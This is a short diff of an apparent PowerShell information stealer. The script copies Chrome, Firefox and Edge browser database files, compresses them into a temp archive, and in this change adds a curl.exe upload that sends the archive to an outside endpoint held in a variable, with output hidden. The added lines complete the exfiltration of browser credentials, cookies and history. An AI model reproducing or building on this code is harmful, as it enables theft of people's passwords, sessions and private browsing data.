@@ -45,7 +45,9 @@ copyFiles -dbfile $googleDir -folder $googledest -db
 copyFiles -dbfile $firefoxDir -folder $mozdest
 copyFiles -dbfile $edgeDir -folder $edgedest -db
 
-$zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
+$zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.7z")
 Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
 
 
+curl.exe -F file1=@"$zipFileName" $dc | Out-Null
+sleep 1
